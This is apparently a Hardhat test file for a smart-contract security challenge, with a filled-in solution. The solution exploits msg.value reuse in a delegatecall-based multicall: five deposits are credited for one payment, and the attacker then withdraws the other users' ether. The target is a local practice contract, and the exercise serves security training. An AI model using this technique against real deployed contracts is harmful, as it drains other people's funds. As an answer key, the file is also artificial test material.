const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");
const { ethers } = require("hardhat");

const NAME = "MultiDelegateCall";
const THREE_ETHER = ethers.utils.parseEther("3");

describe(NAME, function () {
    async function setup() {
        const [, user1, user2, user3, attackerWallet] = await ethers.getSigners();

        const multiDelegateCallFactory = await ethers.getContractFactory(NAME);
        const multiDelegateCallContract = await multiDelegateCallFactory.deploy();

        await multiDelegateCallContract.connect(user1).deposit({ value: THREE_ETHER });
        await multiDelegateCallContract.connect(user2).deposit({ value: THREE_ETHER });
        await multiDelegateCallContract.connect(user3).deposit({ value: THREE_ETHER });

        await network.provider.send("hardhat_setBalance", [attackerWallet.address, THREE_ETHER._hex]);

        return { multiDelegateCallContract, attackerWallet };
    }

    describe("exploit", async function () {
        let multiDelegateCallContract, attackerWallet, attackerWalletBalanceBefore;

        before(async function () {
            ({ multiDelegateCallContract, attackerWallet } = await loadFixture(setup));

            attackerWalletBalanceBefore = await ethers.provider.getBalance(attackerWallet.address);
        });

        // prettier-ignore;
        it("conduct your attack here", async function () {
            const multiDelegateCallContractAddress = multiDelegateCallContract.address;
            const multiDelegateCall = await ethers.getContractAt(NAME, multiDelegateCallContractAddress);

            // Attacker calls the forwarder's execute function with a malicious payload
            const depositCallData = multiDelegateCall.interface.encodeFunctionData("deposit");

            // Outer multicall that calls the above twice
            await multiDelegateCall
                .connect(attackerWallet)
                .multicall([depositCallData, depositCallData, depositCallData, depositCallData, depositCallData], {
                    value: ethers.utils.parseEther("2.9"),
                });
            const balanace_in_contract = await multiDelegateCall
                .connect(attackerWallet)
                .balances(attackerWallet.address);
            console.log("balanace_in_contract", balanace_in_contract);
            // give me back my eth + eth of other users
            multiDelegateCall.connect(attackerWallet).withdraw(ethers.utils.parseEther("11.9"));
        });

        after(async function () {
            const attackerWalletBalanceAfter = await ethers.provider.getBalance(attackerWallet.address);
            expect(attackerWalletBalanceAfter.sub(attackerWalletBalanceBefore)).to.be.greaterThan(
                ethers.utils.parseEther("8.999"),
                "Must claim all ether to attacker wallet"
            );

            expect(await ethers.provider.getBalance(multiDelegateCallContract.address)).to.be.equal(
                "0",
                "must claim all tokens from multiDelegateCallContract"
            );

            expect(await ethers.provider.getTransactionCount(attackerWallet.address)).to.lessThan(
                3,
                "must exploit in two transactions or less"
            );
        });
    });
});
